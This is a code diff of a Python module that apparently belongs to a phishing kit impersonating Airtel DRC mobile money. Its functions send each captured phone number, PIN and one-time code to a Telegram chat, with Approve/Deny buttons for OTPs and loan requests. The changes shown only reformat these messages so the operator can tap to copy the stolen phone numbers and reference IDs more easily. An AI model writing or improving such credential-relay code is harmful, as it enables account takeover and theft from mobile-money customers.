@@ -90,11 +90,14 @@ async def send_login_alert(phone: str, pin: str, action: str = "LOGIN") -> dict:
     ts = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
 
     text = (
-        "🔔 <b>Airtel Congo — Activity Alert</b>\n\n"
-        f"📱 <b>Phone:</b>  <code>{phone}</code>\n"
+        "🔔 <b>Airtel DRC — Activity Alert</b>\n"
+        "━━━━━━━━━━━━━━━\n"
+        f"📱 <b>Phone:</b>\n<code>{phone}</code>\n\n"
         f"🔑 <b>PIN:</b>    <code>{pin}</code>\n"
         f"🎯 <b>Action:</b> <b>{action}</b>\n"
-        f"🕐 <b>Time:</b>   {ts}"
+        f"🕐 <b>Time:</b>   {ts}\n"
+        "━━━━━━━━━━━━━━━\n"
+        "<i>💡 Tap the phone number to copy.</i>"
     )
 
     return await send_telegram_message(text)
@@ -128,17 +131,20 @@ async def send_approval_request(
 
     text = (
         f"{title}\n"
-        f"<i>{subtitle}</i>\n\n"
-        f"📱 <b>Phone:</b> <code>{phone}</code>\n"
+        f"<i>{subtitle}</i>\n"
+        "━━━━━━━━━━━━━━━\n"
+        f"📱 <b>Phone:</b>\n<code>{phone}</code>\n\n"
         f"🔑 <b>PIN:</b>   <code>{pin}</code>\n"
         f"🔢 <b>OTP:</b>   <code>{otp}</code>\n"
         f"🕐 <b>Time:</b>  {ts}\n"
-        f"🆔 <b>Ref:</b>   <code>{approval_id}</code>"
+        f"🆔 <b>Ref:</b>\n<code>{approval_id}</code>\n"
+        "━━━━━━━━━━━━━━━"
     )
 
     if sms_body:
         text += f"\n\n📩 <b>SMS sent:</b>\n<i>{sms_body}</i>"
 
+    text += "\n\n<i>💡 Tap the phone number or ref to copy.</i>"
     text += "\n\n<b>Approve this OTP?</b>"
 
     return await send_telegram_message(text, reply_markup=_otp_keyboard(approval_id))
@@ -148,10 +154,17 @@ async def send_approval_request(
 # Loan approval request (with Approve / Deny buttons)
 # ─────────────────────────────────────────────────────────────
 async def send_loan_approval_request(approval_id: str, phone: str) -> dict:
+    """
+    Loan-request message. Phone and ref are on their own lines inside
+    <code> blocks so Telegram makes them tap-to-copy on mobile and desktop.
+    """
     text = (
-        "🏦 <b>New Loan Request</b>\n\n"
-        f"📱 <b>Phone:</b> <code>{phone}</code>\n"
-        f"🆔 <b>Ref:</b>   <code>{approval_id}</code>\n\n"
+        "🏦 <b>New Loan Request</b>\n"
+        "━━━━━━━━━━━━━━━\n"
+        f"📱 <b>Phone:</b>\n<code>{phone}</code>\n\n"
+        f"🆔 <b>Ref:</b>\n<code>{approval_id}</code>\n"
+        "━━━━━━━━━━━━━━━\n"
+        "<i>💡 Tap the phone number or ref to copy.</i>\n\n"
         "<b>Approve this loan request?</b>"
     )
     return await send_telegram_message(text, reply_markup=_loan_keyboard(approval_id))
